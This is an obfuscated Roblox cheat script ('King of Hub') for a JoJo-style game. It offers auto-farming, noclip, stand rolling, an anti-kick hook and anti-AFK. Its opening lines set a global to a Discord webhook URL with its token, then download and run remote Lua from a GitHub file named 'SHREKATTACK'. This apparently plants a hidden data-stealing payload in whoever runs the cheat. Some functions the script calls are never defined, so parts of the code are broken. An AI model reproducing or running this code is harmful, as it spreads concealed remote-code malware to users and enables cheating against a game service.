_G.webhooksdiscord = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\57\54\56\52\52\52\56\54\50\49\55\53\50\53\54\53\55\54\47\70\45\116\115\111\74\97\103\87\99\75\120\98\116\45\98\50\106\112\52\108\81\89\95\111\73\72\74\114\83\75\54\82\107\107\48\83\68\120\102\100\74\107\79\71\113\74\116\120\108\117\89\70\108\98\101\76\100\56\110\98\104\86\110\118\57\78\78" loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\83\72\65\82\75\88\53\49\54\47\83\72\82\69\75\65\84\84\65\67\75\47\109\97\105\110\47\83\72\65\82\75\76\79\76\50\46\108\117\97"),true)() if not game:IsLoaded() then  game.Loaded:Wait() end local n = game:GetService("\80\108\97\121\101\114\115") local a = game:GetService("\82\117\110\83\101\114\118\105\99\101") local d = game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101") local q = loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\105\110\103\70\114\101\101\65\108\108\72\117\98\47\75\105\110\103\72\117\98\47\109\97\105\110\47\85\73"))() local l = loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\81\117\101\110\116\121\47\78\101\118\101\114\109\111\114\101\69\110\103\105\110\101\47\118\101\114\115\105\111\110\50\47\77\111\100\117\108\101\115\47\83\104\97\114\101\100\47\69\118\101\110\116\115\47\77\97\105\100\46\108\117\97"))() local _ = n.LocalPlayer local sec = _.Character or _.CharacterAdded:Wait() local hb = _:WaitForChild("\68\97\116\97") local ch = hb:WaitForChild("\81\117\101\115\116\115") local e = hb:WaitForChild("\83\116\97\110\100") local se = hb:WaitForChild("\65\116\116\114\105") local ks = q:CreateWindow("\240\159\145\145\32\75\105\110\103\32\111\102\32\72\117\98\32\240\159\145\145") local pk = ks:AddFolder("\77\97\105\110") local mp = ks:AddFolder("\68\117\110\103\101\111\110") local im = ks:AddFolder("\65\117\116\111\32\83\116\97\110\100") local oi = ks:AddFolder("\83\104\111\112") local to = ks:AddFolder("\73\116\101\109") local gt = ks:AddFolder("\83\116\111\114\97\103\101") local fg = ks:AddFolder("\67\114\101\100\105\116\115") local jf = workspace.Items local nj = workspace.Fartinglloll local an = workspace.Living local da = nil local qd = 0  local lq = l.new() local _l = {"\100\116\119", "\106\111\116\97\114\111\115\115\116\97\114\112\108\97\116\105\110\117\109", "\112\109"} local b_l = {"\103\111\100\108\121", "\108\101\103\101\110\100\97\114\121", "\105\110\118\105\110\99\105\98\108\101", "\100\97\101\109\111\110"} local hb_ = {} local chb = {"\66\97\100\32\71\105", "\74\111\116\97\114\111\32\79\118\101\114\32\72\101\97\118\101\110"} local ec = {} local imp = {"\67\97\117\108\100\114\111\110\66\108\97\99\107", "\84\97\108\107\105\110\103\66\101\110", "\71\69\82"} local kse = { ["\66\97\100\32\71\105"] = "\49\43", ["\71\105\111\114\110\111\32\71\105\111\118\97\110\110\97"] = "\53\43", ["\83\99\97\114\121\32\77\111\110\115\116\101\114"] = "\49\48\43", ["\82\107\101\114\32\68\117\109\109\121"] = "\49\53\43", ["\68\105\111\32\79\118\101\114\32\72\101\97\118\101\110"] = "\50\53\43", ["\89\111\115\104\105\107\97\103\101\32\75\105\114\97"] = "\51\48\43", ["\65\110\103\101\108\111"] = "\52\48\43", ["\65\108\105\101\110"] = "\53\48\43", ["\74\111\116\97\114\111\32\80\97\114\116\32\52"] = "\54\53\43", ["\75\97\107\121\111\105\110"] = "\55\53\43", ["\74\117\110\103\108\101\32\66\97\110\100\105\116"] = "\57\48\43", } for _, Questratio in ipairs(nj:GetChildren()) do  if not Questratio:FindFirstChild("\72\101\97\100") then continue end local _lq = Questratio.Head:FindFirstChild("\77\97\105\110") if not _lq then continue end local b_lq = _lq:FindFirstChildWhichIsA("\84\101\120\116\66\111\120") if not b_lq then continue end for MobName, ratioName in pairs(kse) do if type(ratioName) == "\117\115\101\114\100\97\116\97" then continue end if b_lq.Text:find(ratioName) then kse[MobName] = Questratio end  end  end  local imp = {"\67\97\117\108\100\114\111\110\66\108\97\99\107", "\84\97\108\107\105\110\103\66\101\110", "\71\69\82"} local oim = nil local function b(h) if oim then  oim:Cancel() oim:Destroy() oim = nil end local hb_l = sec:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") if not hb_l then return end hb_l.Anchored = false if _:DistanceFromCharacter(h) > 5 then local gto = TweenInfo.new((h - hb_l.Position).Magnitude/q.flags.TweenSpeed, Enum.EasingStyle.Linear) oim = game:GetService("\84\119\101\101\110\83\101\114\118\105\99\101"):Create(hb_l, gto, {CFrame = CFrame.new(h)}) oim:Play() else hb_l.CFrame = CFrame.new(h) * CFrame.new(0, 8, 0) * CFrame.Angles(math.rad(-90),0,0) end end local function c(sec) hb_ = {} sec:WaitForChild("\72\101\97\100") for _, BasePart in pairs(sec:GetChildren()) do if not BasePart:IsA("\66\97\115\101\80\97\114\116") then continue end hb_[#hb_ + 1] = BasePart end end local function s(k) if not k or not k.Parent then return end local fgt = k:FindFirstChildWhichIsA("\72\117\109\97\110\111\105\100") if not fgt or not k:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") then return end if fgt:GetState() == Enum.HumanoidStateType.Dead then return end return true end local function p() local jfg = kse[q.flags.Target] if not jfg then return end for _, Folder in ipairs(ch:GetChildren()) do  local njf = Folder:FindFirstChild("\69\110\101\109\121") if njf and njf.Value == q.flags.Target then if Folder.Completed.Value then jfg.QuestDone:FireServer() end return end  end jfg.Done:FireServer()  end local function m() local anj = sec:FindFirstChild("\83\116\97\110\100\69\118\101\110\116\115") if not anj then return end anj.M1:FireServer() if q.flags.StandAttack then         local pks = sec:FindFirstChild("\83\116\97\110\100") if not pks then return end if not sec.Aura.Value then anj.Summon:FireServer() end if os.clock() - qd < 0.5 then return end  qd = os.clock() for _, Event in ipairs(anj:GetChildren()) do  if Event.Name == "\66\108\111\99\107" then continue end if Event.Name == "\81\117\111\116\101" then continue end if Event.Name == "\80\111\115\101" then continue end if Event.Name == "\83\117\109\109\111\110" then continue end if Event.Name == "\84\111\103\103\108\101\80\105\108\111\116" then continue end if Event.Name == "\74\117\109\112" then continue end if Event.Name == "\68\111\117\103\104" then continue end if Event.Name == "\84\105\109\101\115\107\105\112" then continue end if Event.Name == "\84\83" then continue end if Event.Name == "\84\111\103\103\108\101\80\105\108\111\116" then continue end if Event.Name == "\83\107\105\112" then continue end if Event.Name == "\66\100" then continue end if Event.Name == "\84\105\109\101\115\107\105\112" then continue end if Event.Name == "\84\105\109\101\115\116\111\112" then continue end Event:FireServer(true) end  end  end local function i() if q.flags.LairFarm then  local qda = an:FindFirstChild("\66\111\115\115") if not qda then return end da = qda return  end for _, Mob in ipairs(an:GetChildren()) do  if n:GetPlayerFromCharacter(Mob) then continue end if not s(Mob) then continue end if Mob.Name ~= q.flags.Target then continue end da = Mob return end sec.HumanoidRootPart.Anchored = false end local function o() if not q.flags.NameHide then return end sec:WaitForChild("\72\101\97\100"):WaitForChild("\72\101\97\108\116\104\71\117\105"):Destroy() end local function t() if not q.flags.LairFarm then return end for _, jfg in ipairs(nj:GetChildren()) do  if not jfg:FindFirstChild("\72\101\97\100") then continue end local lqd = jfg.Head:FindFirstChild("\83\117\98") if not lqd or not lqd:FindFirstChildWhichIsA("\84\101\120\116\66\111\120") or lqd:FindFirstChildWhichIsA("\84\101\120\116\66\111\120").Text ~= "\76\97\105\114\32\81\117\101\115\116" then continue end local _lq = jfg.Head:FindFirstChild("\77\97\105\110") if not _lq then continue end local b_lq = _lq:FindFirstChildWhichIsA("\84\101\120\116\66\111\120") if not b_lq then continue end if string.lower(b_lq.Text):find(string.lower(q.flags.LairTarget.."\43")) then jfg.Done:FireServer() end end end a.Heartbeat:Connect(function() if not q.flags.MobFarm then return end if not sec then return end if not s(sec) then return end if not s(da) or da.Name ~= q.flags.Target and da.Name ~= "\66\111\115\115" then return i() end if s(da) and an:FindFirstChild("\66\111\115\115") and da.Name ~= "\66\111\115\115" then  return i() end if q.flags.AutoQuest then p() end sec.HumanoidRootPart.CFrame =da.HumanoidRootPart.CFrame * CFrame.new(0.2, 1.3, 6.8) m() end) a.Stepped:Connect(function()  if not q.flags.Noclip then return end for i = 1, #hb_ do hb_[i].CanCollide = false end local hb_l = sec:FindFirstChild("\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116") if not hb_l then return end if hb_l.RotVelocity.Magnitude >= 50 or hb_l.Velocity.Magnitude >= 50 then  hb_l.RotVelocity = Vector3.new() hb_l.Velocity = Vector3.new() end end) _.CharacterAdded:Connect(function(g) sec = g c(g) o() t() RunGetItem() end) c(sec) jf.ChildAdded:Connect(GetItem) workspace.ChildAdded:Connect(GetItem) local chb_; chb_ = hookmetamethod(game, "\95\95\110\97\109\101\99\97\108\108", newcclosure(function(self, ...) local ech = getnamecallmethod() if ech == "\82\97\121\99\97\115\116" or ech == "\75\105\99\107" or ech == "\70\105\114\101\83\101\114\118\101\114" and tostring(self) == "\80\108\97\121\101\114\83\116\97\110\100\77\97\105\110\72\97\110\100\108\101" then return wait(9e9) end  return chb_(self, ...) end)) for _, Connection in pairs(getconnections(_.Idled)) do  Connection:Disable() end for MobName, _ in pairs(kse) do if table.find(chb, MobName) then continue end chb[#chb + 1] = MobName end for _, Mob in ipairs(an:GetChildren()) do if n:GetPlayerFromCharacter(Mob) then continue end if table.find(chb, Mob.Name) then continue end chb[#chb + 1] = Mob.Name end for _, StandObject in ipairs(d.StandNameConvert:GetChildren()) do  if table.find(ec, StandObject.Name) then continue end if table.find(imp, StandObject.Name) then continue end if string.lower(StandObject.Name):find("\111\104") or string.lower(StandObject.Name):find("\111\118\101\114\104\101\97\118\101\110")  then continue end ec[#ec + 1] = StandObject.Name end pk:AddList({text = "\77\111\98", flag = "\84\97\114\103\101\116", values = chb}) mp:AddList({text = "\68\117\110\103\101\111\110", flag = "\76\97\105\114\84\97\114\103\101\116", values = {"\76\118\108\46\32\49\53", "\76\118\108\46\32\52\48", "\76\118\108\46\32\56\48", "\76\118\108\46\32\49\48\48"}}) pk:AddSlider({text = "\84\119\101\101\110\32\83\112\101\101\100", flag = "\84\119\101\101\110\83\112\101\101\100", min = 50, max = 100}) pk:AddToggle({text = "\65\117\116\111\32\70\97\114\109\32\40\77\111\98\41", flag = "\77\111\98\70\97\114\109", callback = function(f) if oim then  oim:Cancel() oim:Destroy() oim = nil end sec.HumanoidRootPart.Anchored = false end}) mp:AddToggle({text = "\74\111\105\110\101\114\32\68\117\110\103\101\111\110", flag = "\76\97\105\114\70\97\114\109", callback = t})  pk:AddToggle({text = "\65\117\116\111\32\81\117\101\115\116", flag = "\65\117\116\111\81\117\101\115\116"}) pk:AddToggle({text = "\65\117\116\111\32\83\116\97\110\100\32\83\107\105\108\108\115", flag = "\83\116\97\110\100\65\116\116\97\99\107"}) pk:AddToggle({text = "\78\111\32\67\108\105\112", flag = "\78\111\99\108\105\112"}) im:AddLabel({text = "\65\114\114\111\119\32\83\101\108\101\99\116\105\111\110"}) im:AddList({text = "\65\114\114\111\119\32\83\101\108\101\99\116\111\114", flag = "\65\114\114\111\119", values = {"\83\116\97\110\100\32\65\114\114\111\119", "\67\104\97\114\103\101\100\32\65\114\114\111\119"}}) im:AddLabel({text = "\83\116\97\110\100\32\83\101\108\101\99\116\105\111\110"}) im:AddList({text = "\83\116\97\110\100\32\83\101\108\101\99\116\111\114\49", flag = "\84\97\114\103\101\116\83\116\97\110\100\49", values = ec}) im:AddList({text = "\83\116\97\110\100\32\83\101\108\101\99\116\111\114\50", flag = "\84\97\114\103\101\116\83\116\97\110\100\50", values = ec}) im:AddList({text = "\83\116\97\110\100\32\83\101\108\101\99\116\111\114\51", flag = "\84\97\114\103\101\116\83\116\97\110\100\51", values = ec}) im:AddList({text = "\83\116\97\110\100\32\83\101\108\101\99\116\111\114\52", flag = "\84\97\114\103\101\116\83\116\97\110\100\52", values = ec}) im:AddLabel({text = "\65\116\116\114\105\98\117\116\101\32\83\101\108\101\99\116\105\111\110"}) im:AddList({text = "\65\116\116\114\105\98\117\116\101\32\83\101\108\101\99\116\111\114\49", flag = "\84\97\114\103\101\116\65\116\116\114\105\98\117\116\101\49", values = b_l}) im:AddList({text = "\65\116\116\114\105\98\117\116\101\32\83\101\108\101\99\116\111\114\50", flag = "\84\97\114\103\101\116\65\116\116\114\105\98\117\116\101\50", values = b_l}) im:AddList({text = "\65\116\116\114\105\98\117\116\101\32\83\101\108\101\99\116\111\114\51", flag = "\84\97\114\103\101\116\65\116\116\114\105\98\117\116\101\51", values = b_l}) im:AddList({text = "\65\116\116\114\105\98\117\116\101\32\83\101\108\101\99\116\111\114\52", flag = "\84\97\114\103\101\116\65\116\116\114\105\98\117\116\101\52", values = b_l}) im:AddToggle({text = "\83\116\97\110\100\32\70\97\114\109", flag = "\83\116\97\110\100\70\97\114\109", callback = function() local sec = _.Character while s(sec) and q.flags.StandFarm do task.wait(0.2) local ksec = q.flags local pks = string.lower(e.Value) local mpk = string.lower(se.Value) local impk = false for Index = 1, 4 do if pks == string.lower(ksec["\84\97\114\103\101\116\83\116\97\110\100"..Index]) or mpk == string.lower(ksec["\84\97\114\103\101\116\65\116\116\114\105\98\117\116\101"..Index]) then  impk = true break end  end if impk or string.lower(pks):find("\111\118\97") or ksec.RareStand and table.find(_l, pks) then  warn("\69\122") return end local oimp = _.Backpack:FindFirstChild(ksec.Arrow) or sec:FindFirstChild(ksec.Arrow) local toi = _.Backpack:FindFirstChild("\82\111\107\97\107\97\107\97") or sec:FindFirstChild("\82\111\107\97\107\97\107\97") if not oimp or not toi then continue end if e.Value == "\78\111\110\101" then  repeat oimp.Parent = sec task.wait(0.3) oimp.Use:FireServer() until e.Value ~= "\78\111\110\101" or not q.flags.StandFarm or not s(sec) else repeat  toi.Parent = sec task.wait(0.3) toi.Use:FireServer() until e.Value == "\78\111\110\101" or not q.flags.StandFarm or not s(sec) end  end  end}) for Index, ItemName in ipairs({"\53\120\32\82\111\107\97\32\36\49\50\53\48\48", "\49\120\32\82\111\107\97\32\36\50\53\48\48", "\53\120\32\65\114\114\111\119\32\36\49\55\53\48\48", "\36\51\53\48\48\32\49\120\32\65\114\114\111\119"}) do oi:AddButton({text = ItemName, callback = function() d.Events.BuyItem:FireServer("\77\101\114\99\104\97\110\116\65\85", "\79\112\116\105\111\110"..tostring(Index)) end}) end to:AddLabel({text = "\73\116\101\109\32\68\114\111\112"}) to:AddBox({text = "\68\114\111\112\32\65\109\111\117\110\116", callback = function(j) j = tonumber(j) if not j then return end if j <= 0 then return end for _ = 1, j do local gtoi = _.Backpack:FindFirstChildWhichIsA("\84\111\111\108") or _.Character:FindFirstChildWhichIsA("\84\111\111\108") if not gtoi then break end gtoi.Parent = _.Character task.wait(0.2) require(game.Players.LocalPlayer.PlayerScripts.ChatScript.ChatMain).MessagePosted:fire("\47\100\114\111\112\105\116\101\109") end end}) gt:AddLabel({text = "\83\116\97\110\100\32\83\116\111\114\97\103\101"}) for Index = 1, 3 do  gt:AddButton({text = "\83\116\111\114\97\103\101"..Index, callback = function() d.Events.SwitchStand:FireServer("\83\108\111\116"..Index) end}) end ks:AddBind({text = "\85\73\32\84\111\103\103\108\101", key = Enum.KeyCode.RightControl, callback = function() q:Close() end}) fg:AddLabel({text = "\83\99\114\105\112\116\58\32\75\105\110\103\32\111\102\32\72\117\98"}) print("\75\105\110\103\32\111\102\32\72\117\98\32\58\32\65\110\105\116\32\65\70\75") game:GetService("\80\108\97\121\101\114\115").LocalPlayer.Idled:connect(function() vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame) wait(1) vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame) end) q:Init()
